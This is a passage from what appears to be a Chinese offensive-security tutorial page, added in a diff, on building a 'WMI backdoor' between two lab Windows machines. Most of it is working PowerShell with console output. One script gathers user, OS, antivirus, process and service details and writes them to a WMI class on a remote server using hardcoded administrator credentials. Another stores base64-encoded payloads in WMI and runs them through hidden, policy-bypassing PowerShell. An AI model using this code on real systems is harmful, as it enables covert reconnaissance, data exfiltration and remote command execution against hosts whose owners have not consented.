+</code></pre></div><h2 id="0x02-进阶wmi技巧---wmi-backdoor">0x02 进阶WMI技巧&mdash;WMI Backdoor</h2>
+<ul>
+<li>测试环境</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">server<span style="color:#960050;background-color:#1e0010">（</span>监听用服务端<span style="color:#960050;background-color:#1e0010">）</span>
+172.16.1.201
+win2012x64
+username<span style="color:#960050;background-color:#1e0010">:</span>administrator
+password<span style="color:#960050;background-color:#1e0010">:</span>1qaz!QAZ
+
+client<span style="color:#960050;background-color:#1e0010">（</span>受控端<span style="color:#960050;background-color:#1e0010">）</span>
+172.16.1.211
+win10x64
+</code></pre></div><ul>
+<li>步骤一:Client获取主机配置信息-连接远程服务器-保存在远程服务器（客户端执行）</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#连接172.16.1.201</span>
+$Options = New-Object Management.ConnectionOptions
+$Options.Username = <span style="color:#e6db74">&#39;makapaka.garden\administrator&#39;</span>
+$Options.Password = <span style="color:#e6db74">&#39;1qaz!QAZ&#39;</span>
+$Options.EnablePrivileges = $True
+$Connection = New-Object Management.ManagementScope
+$Connection.Path = <span style="color:#e6db74">&#39;\\172.16.1.201\root\cimv2&#39;</span>
+$Connection.Options = $Options
+$Connection.Connect()
+$EvilClass = New-Object Management.ManagementClass($Connection, <span style="color:#66d9ef">[String]</span>::Empty, $null)
+<span style="color:#75715e">#新建类名</span>
+$EvilClass[<span style="color:#e6db74">&#39;__CLASS&#39;</span>] = <span style="color:#e6db74">&#39;Win32_UserInfo&#39;</span>
+$EvilClass.Properties.Add(<span style="color:#e6db74">&#39;IP172161211&#39;</span>, <span style="color:#66d9ef">[Management.CimType]</span>::String, $False)
+<span style="color:#75715e">#获取主机配置信息</span>
+$GetOS=Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_OperatingSystem 
+$GetProcess=Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Process
+$GetService=Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Service -Filter <span style="color:#e6db74">&#34;State=&#39;Running&#39;&#34;</span>
+$GetUser=Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_ComputerSystem
+$GetAV=Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
+<span style="color:#75715e">#注：Powershell中换行符为`n</span>
+$EvilClass.Properties[<span style="color:#e6db74">&#39;IP172161211&#39;</span>].Value =$GetUser.UserName+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">`n</span><span style="color:#e6db74">&#34;</span>+<span style="color:#e6db74">&#34;OS:&#34;</span>+$GetOS.Caption+<span style="color:#e6db74">&#34;;&#34;</span>+$GetOS.OSArchitecture+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">`n</span><span style="color:#e6db74">&#34;</span>+<span style="color:#e6db74">&#34;AntiVirusProduct:&#34;</span>+ $GetAV.displayName+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">`n</span><span style="color:#e6db74">&#34;</span>+<span style="color:#e6db74">&#34;Process:&#34;</span>+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">`n</span><span style="color:#e6db74">&#34;</span>+$GetProcess.Name+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">`n</span><span style="color:#e6db74">&#34;</span>+<span style="color:#e6db74">&#34;Service Start:&#34;</span>+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">`n</span><span style="color:#e6db74">&#34;</span>+$GetService.Name
+<span style="color:#75715e">#存储</span>
+$EvilClass.Put()
+</code></pre></div><ul>
+<li>步骤一：结果（客户端执行）</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Path          <span style="color:#960050;background-color:#1e0010">:</span> \\172.16.1.201\root\cimv2<span style="color:#960050;background-color:#1e0010">:</span>Win32_UserInfo
+RelativePath  <span style="color:#960050;background-color:#1e0010">:</span> Win32_UserInfo
+Server        <span style="color:#960050;background-color:#1e0010">:</span> 172.16.1.201
+NamespacePath <span style="color:#960050;background-color:#1e0010">:</span> root\cimv2
+ClassName     <span style="color:#960050;background-color:#1e0010">:</span> Win32_UserInfo
+IsClass       <span style="color:#960050;background-color:#1e0010">:</span> True
+IsInstance    <span style="color:#960050;background-color:#1e0010">:</span> False
+IsSingleton   <span style="color:#960050;background-color:#1e0010">:</span> False
+</code></pre></div><ul>
+<li>步骤二：查询（服务端执行）</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">(<span style="color:#66d9ef">[WmiClass]</span><span style="color:#e6db74">&#39;Win32_UserInfo&#39;</span>).Properties[<span style="color:#e6db74">&#39;IP172161211&#39;</span>]
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\admin&gt; (<span style="color:#66d9ef">[WmiClass]</span><span style="color:#e6db74">&#39;Win32_UserInfo&#39;</span>).Properties[<span style="color:#e6db74">&#39;IP172161211&#39;</span>]
+
+Name       <span style="color:#960050;background-color:#1e0010">:</span> IP172161211
+Value      <span style="color:#960050;background-color:#1e0010">:</span> MAKAPAKA\Dev1
+             OS<span style="color:#960050;background-color:#1e0010">:</span>Microsoft Windows 10 专业版;64 位
+             AntiVirusProduct<span style="color:#960050;background-color:#1e0010">:</span>Windows Defender
+             <span style="color:#66d9ef">Process</span><span style="color:#960050;background-color:#1e0010">:</span>
+             System Idle <span style="color:#66d9ef">Process</span> System Registry smss.exe csrss.exe csrss.exe wininit.exe winlogon.exe services.exe lsa
+             ss.exe svchost.exe fontdrvhost.exe fontdrvhost.exe svchost.exe dwm.exe svchost.exe svchost.exe svchost.exe
+              svchost.exe svchost.exe svchost.exe svchost.exe svchost.exe svchost.exe svchost.exe Memory Compression sv
+             chost.exe svchost.exe svchost.exe svchost.exe spoolsv.exe svchost.exe vmtoolsd.exe vm3dservice.exe VGAuthS
+             ervice.exe MsMpEng.exe vm3dservice.exe svchost.exe dllhost.exe WmiPrvSE.exe msdtc.exe NisSrv.exe MoUsoCore
+             Worker.exe svchost.exe dasHost.exe svchost.exe sihost.exe svchost.exe taskhostw.exe ctfmon.exe explorer.ex
+             e ChsIME.exe svchost.exe SearchIndexer.exe StartMenuExperienceHost.exe RuntimeBroker.exe SearchApp.exe Run
+             timeBroker.exe TextInputHost.exe RuntimeBroker.exe dllhost.exe SecurityHealthSystray.exe SecurityHealthSer
+             vice.exe vmtoolsd.exe cmd.exe conhost.exe MusNotifyIcon.exe OneDrive.exe SgrmBroker.exe uhssvc.exe svchost
+             .exe ApplicationFrameHost.exe svchost.exe powershell.exe powershell.exe conhost.exe svchost.exe Microsoft.
+             Photos.exe RuntimeBroker.exe WmiPrvSE.exe svchost.exe RuntimeBroker.exe smartscreen.exe ChsIME.exe audiodg
+             .exe
+             Service Start<span style="color:#960050;background-color:#1e0010">:</span>
+             Appinfo AppXSvc AudioEndpointBuilder Audiosrv BFE BrokerInfrastructure BTAGService BthAvctpSvc bthserv CDP
+             Svc COMSysApp CoreMessagingRegistrar CryptSvc DcomLaunch DeviceAssociationService Dhcp DiagTrack DispBroke
+             rDesktopSvc Dnscache DoSvc DPS DsSvc DusmSvc EventLog EventSystem fdPHost FDResPub FontCache InstallServic
+             e iphlpsvc KeyIso LanmanServer LanmanWorkstation LicenseManager lmhosts LSM mpssvc MSDTC NcbService Netlog
+             on netprofm NlaSvc nsi PcaSvc PlugPlay Power ProfSvc RasMan RmSvc RpcEptMapper RpcSs SamSs Schedule Securi
+             tyHealthService SEMgrSvc SENS SgrmBroker ShellHWDetection SmsRouter Spooler SSDPSRV SstpSvc StateRepositor
+             y StorSvc SysMain SystemEventsBroker TabletInputService Themes TimeBrokerSvc TokenBroker TrkWks uhssvc Use
+             rManager UsoSvc VaultSvc VGAuthService vm3dservice VMTools W32Time WaaSMedicSvc Wcmsvc WdiServiceHost WdiS
+             ystemHost WdNisSvc WinDefend WinHttpAutoProxySvc Winmgmt WpnService wscsvc WSearch wuauserv cbdhsvc_c66fa
+             CDPUserSvc_c66fa OneSyncSvc_c66fa PimIndexMaintenanceSvc_c66fa UnistoreSvc_c66fa UserDataSvc_c66fa WpnUser
+             Service_c66fa
+Type       <span style="color:#960050;background-color:#1e0010">:</span> String
+IsLocal    <span style="color:#960050;background-color:#1e0010">:</span> True
+IsArray    <span style="color:#960050;background-color:#1e0010">:</span> False
+Origin     <span style="color:#960050;background-color:#1e0010">:</span> Win32_UserInfo
+Qualifiers <span style="color:#960050;background-color:#1e0010">:</span> {CIMTYPE}
+</code></pre></div><ul>
+<li>步骤三：Client端获取指令并执行</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Client加密存储指令
+Client读取指令-解密-执行
+</code></pre></div><p>客户端代码</p>
+<ol>
+<li>
+<p>Client加密存储指令 (需要提升权限)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#定义Payload，为保证变量能够解析，需要使用单引号‘</span>
+$Payload=<span style="color:#e6db74">@&#39;
+</span><span style="color:#e6db74">$Options = New-Object Management.ConnectionOptions
+</span><span style="color:#e6db74">$Options.Username = &#39;makapaka.garden\administrator&#39;
+</span><span style="color:#e6db74">$Options.Password = &#39;1qaz!QAZ&#39;
+</span><span style="color:#e6db74">$Options.EnablePrivileges = $True
+</span><span style="color:#e6db74">$Connection = New-Object Management.ManagementScope
+</span><span style="color:#e6db74">$Connection.Path = &#39;\\172.16.1.201\root\cimv2&#39;
+</span><span style="color:#e6db74">$Connection.Options = $Options
+</span><span style="color:#e6db74">$Connection.Connect()
+</span><span style="color:#e6db74">$EvilClass = New-Object Management.ManagementClass($Connection, [String]::Empty, $null)
+</span><span style="color:#e6db74">$EvilClass[&#39;__CLASS&#39;] = &#39;Win32_CommandTest&#39;
+</span><span style="color:#e6db74">$EvilClass.Properties.Add(&#39;IP172161211&#39;, [Management.CimType]::String, $False)
+</span><span style="color:#e6db74">$EvilClass.Properties[&#39;IP172161211&#39;].Value =&#34;Run Command Test!&#34; 
+</span><span style="color:#e6db74">$EvilClass.Put() 
+</span><span style="color:#e6db74">&#39;@</span>
+<span style="color:#75715e">#对payload作base64加密</span>
+$bytes  = <span style="color:#66d9ef">[System.Text.Encoding]</span>::Unicode.GetBytes($Payload);
+$EncodedPayload = <span style="color:#66d9ef">[System.Convert]</span>::ToBase64String($bytes); 
+<span style="color:#75715e">#存储加密后的payload</span>
+$StaticClass = New-Object Management.ManagementClass(<span style="color:#e6db74">&#39;root\cimv2&#39;</span>, $null,$null)
+$StaticClass.Name = <span style="color:#e6db74">&#39;Win32_Command&#39;</span>
+$StaticClass.Put()
+$StaticClass.Properties.Add(<span style="color:#e6db74">&#39;EnCommand&#39;</span> , $EncodedPayload)
+$StaticClass.Put()
+</code></pre></div><p>Tip:</p>
+<p>Base64转换</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$a = ipconfig /all
+<span style="color:#66d9ef">[Convert]</span>::ToBase64String(<span style="color:#66d9ef">[Text.Encoding]</span>::UTF8.GetBytes($a))
+<span style="color:#66d9ef">[Text.Encoding]</span>::Utf8.GetString(<span style="color:#66d9ef">[Convert]</span>::FromBase64String($b))
+</code></pre></div><p>Client加密存储指令，命令执行 (需要提升权限)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#定义Payload，为保证变量能够解析，需要使用单引号‘</span>
+$Payload=<span style="color:#e6db74">@&#39;
+</span><span style="color:#e6db74">$Options = New-Object Management.ConnectionOptions
+</span><span style="color:#e6db74">$Options.Username = &#39;makapaka.garden\administrator&#39;
+</span><span style="color:#e6db74">$Options.Password = &#39;1qaz!QAZ&#39;
+</span><span style="color:#e6db74">$Options.EnablePrivileges = $True
+</span><span style="color:#e6db74">$Connection = New-Object Management.ManagementScope
+</span><span style="color:#e6db74">$Connection.Path = &#39;\\172.16.1.201\root\cimv2&#39;
+</span><span style="color:#e6db74">$Connection.Options = $Options
+</span><span style="color:#e6db74">$Connection.Connect()
+</span><span style="color:#e6db74">$EvilClass = New-Object Management.ManagementClass($Connection, [String]::Empty, $null)
+</span><span style="color:#e6db74">$EvilClass[&#39;__CLASS&#39;] = &#39;Win32_CommandTest&#39;
+</span><span style="color:#e6db74">$EvilClass.Properties.Add(&#39;IP172161211&#39;, [Management.CimType]::String, $False)
+</span><span style="color:#e6db74">$command = ipconfig /all
+</span><span style="color:#e6db74">$EvilClass.Properties[&#39;IP172161211&#39;].Value =[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($command)) 
+</span><span style="color:#e6db74">$EvilClass.Put() 
+</span><span style="color:#e6db74">&#39;@</span>
+<span style="color:#75715e">#对payload作base64加密</span>
+$bytes  = <span style="color:#66d9ef">[System.Text.Encoding]</span>::Unicode.GetBytes($Payload);
+$EncodedPayload = <span style="color:#66d9ef">[System.Convert]</span>::ToBase64String($bytes); 
+<span style="color:#75715e">#存储加密后的payload</span>
+$StaticClass = New-Object Management.ManagementClass(<span style="color:#e6db74">&#39;root\cimv2&#39;</span>, $null,$null)
+$StaticClass.Name = <span style="color:#e6db74">&#39;Win32_Command&#39;</span>
+$StaticClass.Put()
+$StaticClass.Properties.Add(<span style="color:#e6db74">&#39;EnCommand&#39;</span> , $EncodedPayload)
+$StaticClass.Put()
+</code></pre></div><p>Base64命令执行使用</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$command = ipconfig /all
+$EvilClass.Properties[<span style="color:#e6db74">&#39;IP172161211&#39;</span>].Value =<span style="color:#66d9ef">[Convert]</span>::ToBase64String(<span style="color:#66d9ef">[Text.Encoding]</span>::UTF8.GetBytes($command))
+</code></pre></div><p>Base64服务端解密</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$result=(<span style="color:#66d9ef">[WmiClass]</span> <span style="color:#e6db74">&#39;Win32_CommandTest&#39;</span>).Properties[<span style="color:#e6db74">&#39;IP172161211&#39;</span>].Value
+<span style="color:#66d9ef">[Text.Encoding]</span>::Utf8.GetString(<span style="color:#66d9ef">[Convert]</span>::FromBase64String($result))
+</code></pre></div><p>结果</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\admin&gt; <span style="color:#66d9ef">[Text.Encoding]</span>::Utf8.GetString(<span style="color:#66d9ef">[Convert]</span>::FromBase64String($result))
+ Windows IP 配置     主机名  . . . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> DevC1    主 DNS 后缀 . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> makapaka.garden
+  节点类型  . . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 混合    IP 路由已启用 . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 否    WINS 代理已启用 . . . . . . . .
+ . <span style="color:#960050;background-color:#1e0010">:</span> 否    DNS 后缀搜索列表  . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> makapaka.garden                                        localdomain  以太
+网适配器 Ethernet0<span style="color:#960050;background-color:#1e0010">:</span>     连接特定的 DNS 后缀 . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> localdomain    描述. . . . . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> Intel(R)
+ 82574L Gigabit Network Connection    物理地址. . . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 00-0C-29-6B-36-09    DHCP 已启用 . . . . . .
+. . . . . <span style="color:#960050;background-color:#1e0010">:</span> 是    自动配置已启用. . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 是    本地链接 IPv6 地址. . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> fe80::95a8<span style="color:#960050;background-color:#1e0010">:</span>a9a1<span style="color:#960050;background-color:#1e0010">:</span>1c42<span style="color:#960050;background-color:#1e0010">:</span>66
+bb<span style="color:#66d9ef">%</span>9(首选)     IPv4 地址 . . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 192.168.235.135(首选)     子网掩码  . . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 255.25
+5.255.0    获得租约的时间  . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 2020年6月28日 9<span style="color:#960050;background-color:#1e0010">:</span>28<span style="color:#960050;background-color:#1e0010">:</span>06    租约过期的时间  . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 2020年6月28
+日 11<span style="color:#960050;background-color:#1e0010">:</span>43<span style="color:#960050;background-color:#1e0010">:</span>06    默认网关. . . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 192.168.235.2    DHCP 服务器 . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 192.168.235.254
+    DHCPv6 IAID . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 100666409    DHCPv6 客户端 DUID  . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 00-01-00-01-28-4E-4E-9C-00-0C-
+29-6B-36-09    DNS 服务器  . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 192.168.235.2    主 WINS 服务器  . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 192.168.235.2
+  TCPIP 上的 NetBIOS  . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 已启用  以太网适配器 Ethernet1<span style="color:#960050;background-color:#1e0010">:</span>     连接特定的 DNS 后缀 . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span>     描述.
+ . . . . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> Intel(R) 82574L Gigabit Network Connection <span style="color:#75715e">#2    物理地址. . . . . . . . . . . . . : 00-</span>
+0C-29-6B-36-13    DHCP 已启用 . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 否    自动配置已启用. . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 是    本地链接 IPv6 地
+址. . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> fe80::3419<span style="color:#960050;background-color:#1e0010">:</span>de22<span style="color:#960050;background-color:#1e0010">:</span>d5d<span style="color:#960050;background-color:#1e0010">:</span>d52d<span style="color:#66d9ef">%</span>13(首选)     IPv4 地址 . . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 172.16.1.211(首选)     子
+网掩码  . . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 255.255.255.0    默认网关. . . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 172.16.1.201    DHCPv6 IAID . .
+. . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 419433513    DHCPv6 客户端 DUID  . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 00-01-00-01-28-4E-4E-9C-00-0C-29-6B-36-09    DNS
+服务器  . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 172.16.1.201    TCPIP 上的 NetBIOS  . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 已启用  以太网适配器 蓝牙网络连接<span style="color:#960050;background-color:#1e0010">:</span>
+    媒体状态  . . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 媒体已断开连接    连接特定的 DNS 后缀 . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span>     描述. . . . . . . . .
+ . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> Bluetooth Device (Personal Area Network)    物理地址. . . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> A8-7E-EA-E9-D7-06    DHC
+P 已启用 . . . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 是    自动配置已启用. . . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 
+</code></pre></div><p>结果</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Windows\system32&gt; $StaticClass.Put()
+
+Path          <span style="color:#960050;background-color:#1e0010">:</span> \\DEVC1\ROOT\cimv2<span style="color:#960050;background-color:#1e0010">:</span>Win32_Command
+RelativePath  <span style="color:#960050;background-color:#1e0010">:</span> Win32_Command
+Server        <span style="color:#960050;background-color:#1e0010">:</span> DEVC1
+NamespacePath <span style="color:#960050;background-color:#1e0010">:</span> ROOT\cimv2
+ClassName     <span style="color:#960050;background-color:#1e0010">:</span> Win32_Command
+IsClass       <span style="color:#960050;background-color:#1e0010">:</span> True
+IsInstance    <span style="color:#960050;background-color:#1e0010">:</span> False
+IsSingleton   <span style="color:#960050;background-color:#1e0010">:</span> False
+</code></pre></div></li>
+<li>
+<p>Client查看加密的payload</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">(<span style="color:#66d9ef">[WmiClass]</span> <span style="color:#e6db74">&#39;Win32_Command&#39;</span>).Properties[<span style="color:#e6db74">&#39;EnCommand&#39;</span>].Value
+</code></pre></div><p>结果</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Windows\system32&gt; (<span style="color:#66d9ef">[WmiClass]</span> <span style="color:#e6db74">&#39;Win32_Command&#39;</span>).Properties[<span style="color:#e6db74">&#39;EnCommand&#39;</span>]
+
+Name       <span style="color:#960050;background-color:#1e0010">:</span> EnCommand
+Value      <span style="color:#960050;background-color:#1e0010">:</span> JABPAHAAdABpAG8AbgBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQwBvAG4AbgBlAGMAdA
+             BpAG8AbgBPAHAAdABpAG8AbgBzAAoAJABPAHAAdABpAG8AbgBzAC4AVQBzAGUAcgBuAGEAbQBlACAAPQAgACcAbQBhAGsAYQBwAGEAawBh
+             AC4AZwBhAHIAZABlAG4AXABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACcACgAkAE8AcAB0AGkAbwBuAHMALgBQAGEAcwBzAHcAbwByAG
+             QAIAA9ACAAJwAxAHEAYQB6ACEAUQBBAFoAJwAKACQATwBwAHQAaQBvAG4AcwAuAEUAbgBhAGIAbABlAFAAcgBpAHYAaQBsAGUAZwBlAHMA
+             IAA9ACAAJABUAHIAdQBlAAoAJABDAG8AbgBuAGUAYwB0AGkAbwBuACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABNAGEAbgBhAGcAZQ
+             BtAGUAbgB0AC4ATQBhAG4AYQBnAGUAbQBlAG4AdABTAGMAbwBwAGUACgAkAEMAbwBuAG4AZQBjAHQAaQBvAG4ALgBQAGEAdABoACAAPQAg
+             ACcAXABcADEANwAyAC4AMQA2AC4AMQAuADIAMAAxAFwAcgBvAG8AdABcAGMAaQBtAHYAMgAnAAoAJABDAG8AbgBuAGUAYwB0AGkAbwBuAC
+             4ATwBwAHQAaQBvAG4AcwAgAD0AIAAkAE8AcAB0AGkAbwBuAHMACgAkAEMAbwBuAG4AZQBjAHQAaQBvAG4ALgBDAG8AbgBuAGUAYwB0ACgA
+             KQAKACQARQB2AGkAbABDAGwAYQBzAHMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBNAGEAbg
+             BhAGcAZQBtAGUAbgB0AEMAbABhAHMAcwAoACQAQwBvAG4AbgBlAGMAdABpAG8AbgAsACAAWwBTAHQAcgBpAG4AZwBdADoAOgBFAG0AcAB0
+             AHkALAAgACQAbgB1AGwAbAApAAoAJABFAHYAaQBsAEMAbABhAHMAcwBbACcAXwBfAEMATABBAFMAUwAnAF0AIAA9ACAAJwBXAGkAbgAzAD
+             IAXwBDAG8AbQBtAGEAbgBkAFQAZQBzAHQAJwAKACQARQB2AGkAbABDAGwAYQBzAHMALgBQAHIAbwBwAGUAcgB0AGkAZQBzAC4AQQBkAGQA
+             KAAnAEkAUAAxADcAMgAxADYAMQAyADEAMQAnACwAIABbAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBDAGkAbQBUAHkAcABlAF0AOgA6AFMAdA
+             ByAGkAbgBnACwAIAAkAEYAYQBsAHMAZQApAAoAJABFAHYAaQBsAEMAbABhAHMAcwAuAFAAcgBvAHAAZQByAHQAaQBlAHMAWwAnAEkAUAAx
+             ADcAMgAxADYAMQAyADEAMQAnAF0ALgBWAGEAbAB1AGUAIAA9ACIAUgB1AG4AIABDAG8AbQBtAGEAbgBkACAAVABlAHMAdAAhACIAIAAKAC
+             QARQB2AGkAbABDAGwAYQBzAHMALgBQAHUAdAAoACkAIAA=
+Type       <span style="color:#960050;background-color:#1e0010">:</span> String
+IsLocal    <span style="color:#960050;background-color:#1e0010">:</span> True
+IsArray    <span style="color:#960050;background-color:#1e0010">:</span> False
+Origin     <span style="color:#960050;background-color:#1e0010">:</span> Win32_Command
+Qualifiers <span style="color:#960050;background-color:#1e0010">:</span> {CIMTYPE}
+</code></pre></div></li>
+<li>
+<p>Client读取指令-解密-执行</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#读取加密payload</span>
+$EncodedPayload=(<span style="color:#66d9ef">[WmiClass]</span> <span style="color:#e6db74">&#39;Win32_Command&#39;</span>).Properties[<span style="color:#e6db74">&#39;EnCommand&#39;</span>].Value
+<span style="color:#75715e">#PowerShell执行命令</span>
+$PowerShellPayload = <span style="color:#e6db74">&#34;powershell -ep bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -enc $EncodedPayload&#34;</span>
+Invoke-WmiMethod  -Class Win32_Process -Name Create -ArgumentList $PowerShellPayload
+<span style="color:#75715e">#显示解密指令</span>
+$bytes2  = <span style="color:#66d9ef">[System.Convert]</span>::FromBase64String($EncodedPayload);
+$decoded = <span style="color:#66d9ef">[System.Text.Encoding]</span>::Unicode.GetString($bytes2); 
+<span style="color:#e6db74">&#34;decoded Payload:&#34;</span>
+$decoded
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Windows\system32&gt; $decoded
+$Options = New-Object Management.ConnectionOptions
+$Options.Username = <span style="color:#e6db74">&#39;makapaka.garden\administrator&#39;</span>
+$Options.Password = <span style="color:#e6db74">&#39;1qaz!QAZ&#39;</span>
+$Options.EnablePrivileges = $True
+$Connection = New-Object Management.ManagementScope
+$Connection.Path = <span style="color:#e6db74">&#39;\\172.16.1.201\root\cimv2&#39;</span>
+$Connection.Options = $Options
+$Connection.Connect()
+$EvilClass = New-Object Management.ManagementClass($Connection, <span style="color:#66d9ef">[String]</span>::Empty, $null)
+$EvilClass[<span style="color:#e6db74">&#39;__CLASS&#39;</span>] = <span style="color:#e6db74">&#39;Win32_CommandTest&#39;</span>
+$EvilClass.Properties.Add(<span style="color:#e6db74">&#39;IP172161211&#39;</span>, <span style="color:#66d9ef">[Management.CimType]</span>::String, $False)
+$EvilClass.Properties[<span style="color:#e6db74">&#39;IP172161211&#39;</span>].Value =<span style="color:#e6db74">&#34;Run Command Test!&#34;</span>
+$EvilClass.Put()
+</code></pre></div></li>
+<li>
+<p>Server端执行查看结果</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">(<span style="color:#66d9ef">[WmiClass]</span> <span style="color:#e6db74">&#39;Win32_CommandTest&#39;</span>).Properties[<span style="color:#e6db74">&#39;IP172161211&#39;</span>]
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\admin&gt; (<span style="color:#66d9ef">[WmiClass]</span> <span style="color:#e6db74">&#39;Win32_CommandTest&#39;</span>).Properties[<span style="color:#e6db74">&#39;IP172161211&#39;</span>]
+
+Name       <span style="color:#960050;background-color:#1e0010">:</span> IP172161211
+Value      <span style="color:#960050;background-color:#1e0010">:</span> Run Command Test!
+Type       <span style="color:#960050;background-color:#1e0010">:</span> String
+IsLocal    <span style="color:#960050;background-color:#1e0010">:</span> Trueserver端执行
+IsArray    <span style="color:#960050;background-color:#1e0010">:</span> False
+Origin     <span style="color:#960050;background-color:#1e0010">:</span> Win32_CommandTest
